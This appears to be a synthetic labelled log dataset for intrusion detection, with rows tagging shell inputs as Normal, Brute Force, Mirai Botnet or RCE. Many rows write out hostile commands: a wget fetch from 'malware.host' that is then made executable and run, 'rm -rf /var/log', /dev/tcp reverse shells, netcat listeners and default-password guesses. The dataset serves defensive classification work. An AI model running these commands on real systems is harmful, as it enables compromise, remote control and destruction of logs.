2026-01-08T10:46:17.310501,192.168.1.70,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.2,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.209,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.34,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.123,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.147,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.45,id,Normal
2026-01-08T10:46:17.309502,192.168.1.26,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.231,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.132,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.222,id,Normal
2026-01-08T10:46:17.308503,192.168.1.241,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.129,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.117,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.254,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.82,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.3,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.211,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.54,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.96,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.207,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.33,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.142,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.96,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.102,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.157,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.20,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.212,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.152,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.141,id,Normal
2026-01-08T10:46:17.312501,192.168.1.50,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.28,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.11,id,Normal
2026-01-08T10:46:17.306501,192.168.1.120,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.223,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.81,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.29,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.178,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.138,id,Normal
2026-01-08T10:46:17.308503,192.168.1.150,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.204,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.56,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.249,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.170,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.142,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.133,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.226,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.111,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.77,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.64,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.51,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.54,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.47,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.160,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.13,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.74,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.4,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.55,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.182,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.86,nc -lvp 4444,RCE
2026-01-08T10:46:17.306501,192.168.1.241,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.115,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.102,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.155,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.205,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.210,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.198,id,Normal
2026-01-08T10:46:17.310501,192.168.1.193,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.173,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.137,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.33,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.193,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.71,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.142,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.212,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.103,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.26,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.252,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.229,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.89,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.21,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.80,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.198,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.177,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.125,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.76,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.203,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.140,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.159,id,Normal
2026-01-08T10:46:17.309502,192.168.1.214,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.254,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.151,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.122,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.184,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.6,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.158,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.253,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.228,id,Normal
2026-01-08T10:46:17.310501,192.168.1.142,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.163,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.50,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.34,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.31,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.5,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.200,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.164,support,Brute Force
2026-01-08T10:46:17.309502,192.168.1.206,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.56,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.192,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.46,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.87,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.103,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.144,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.210,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.108,id,Normal
2026-01-08T10:46:17.310501,192.168.1.67,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.174,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.249,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.102,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.165,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.188,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.59,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.220,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.110,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.176,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.137,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.75,id,Normal
2026-01-08T10:46:17.307501,192.168.1.206,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.135,id,Normal
2026-01-08T10:46:17.306501,192.168.1.245,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.56,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.249,id,Normal
2026-01-08T10:46:17.312501,192.168.1.219,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.143,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.251,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.16,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.104,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.76,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.26,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.161,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.217,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.210,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.37,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.138,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.186,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.142,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.252,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.232,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.250,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.10,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.180,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.242,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.177,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.78,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.79,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.126,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.248,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.82,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.117,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.51,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.34,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.200,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.246,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.61,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.214,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.209,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.20,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.45,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.218,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.27,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.147,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.158,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.139,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.142,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.190,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.235,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.114,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.62,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.40,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.254,id,Normal
2026-01-08T10:46:17.306501,192.168.1.176,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.49,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.55,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.62,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.49,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.16,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.188,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.115,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.3,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.43,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.127,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.134,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.23,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.17,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.206,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.152,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.135,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.65,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.193,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.14,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.196,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.181,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.248,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.11,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.147,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.79,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.56,id,Normal
2026-01-08T10:46:17.311501,192.168.1.83,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.134,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.217,id,Normal
2026-01-08T10:46:17.311501,192.168.1.81,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.28,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.103,id,Normal
2026-01-08T10:46:17.310501,192.168.1.34,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.82,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.197,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.158,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.218,id,Normal
2026-01-08T10:46:17.308503,192.168.1.199,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.61,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.142,admin,Brute Force
2026-01-08T10:46:17.312501,192.168.1.133,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.44,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.8,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.71,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.130,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.87,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.110,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.154,nc -lvp 4444,RCE
2026-01-08T10:46:17.311501,192.168.1.97,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.15,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.174,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.233,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.165,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.24,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.196,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.123,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.209,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.149,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.211,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.248,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.255,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.125,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.93,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.15,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.244,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.4,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.128,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.8,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.142,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.163,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.35,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.75,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.102,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.184,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.97,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.173,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.180,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.208,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.25,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.12,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.149,id,Normal
2026-01-08T10:46:17.307501,192.168.1.90,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.228,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.103,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.231,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.8,id,Normal
2026-01-08T10:46:17.308503,192.168.1.20,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.114,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.175,id,Normal
2026-01-08T10:46:17.309502,192.168.1.64,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.212,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.180,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.112,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.42,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.247,support,Brute Force
2026-01-08T10:46:17.309502,192.168.1.156,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.1,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.75,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.53,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.191,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.33,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.59,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.112,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.223,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.134,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.93,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.4,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.177,id,Normal
2026-01-08T10:46:17.308503,192.168.1.171,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.242,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.234,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.143,id,Normal
2026-01-08T10:46:17.306501,192.168.1.2,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.152,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.120,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.158,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.78,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.232,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.133,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.110,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.38,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.180,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.58,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.88,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.217,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.146,id,Normal
2026-01-08T10:46:17.310501,192.168.1.1,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.129,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.183,id,Normal
2026-01-08T10:46:17.307501,192.168.1.66,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.211,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.144,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.203,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.32,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.97,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.173,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.26,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.67,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.209,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.67,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.179,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.311501,192.168.1.164,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.41,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.188,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.111,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.92,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.249,id,Normal
2026-01-08T10:46:17.312501,192.168.1.182,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.9,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.222,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.221,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.43,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.12,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.18,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.75,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.207,id,Normal
2026-01-08T10:46:17.307501,192.168.1.122,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.53,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.91,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.233,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.28,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.125,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.121,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.16,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.226,id,Normal
2026-01-08T10:46:17.306501,192.168.1.56,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.148,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.99,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.193,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.32,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.82,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.219,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.11,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.160,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.63,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.93,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.69,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.65,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.187,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.96,id,Normal
2026-01-08T10:46:17.306501,192.168.1.78,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.85,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.183,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.83,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.13,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.235,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.122,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.149,id,Normal
2026-01-08T10:46:17.310501,192.168.1.21,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.106,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.177,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.125,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.120,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.8,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.118,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.187,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.84,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.145,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.49,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.13,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.83,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.107,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.151,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.9,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.190,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.198,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.133,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.82,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.226,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.182,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.23,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.227,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.219,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.169,id,Normal
2026-01-08T10:46:17.307501,192.168.1.29,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.61,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.77,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.71,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.83,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.251,id,Normal
2026-01-08T10:46:17.306501,192.168.1.53,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.24,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.243,rm -rf /var/log,Mirai Botnet
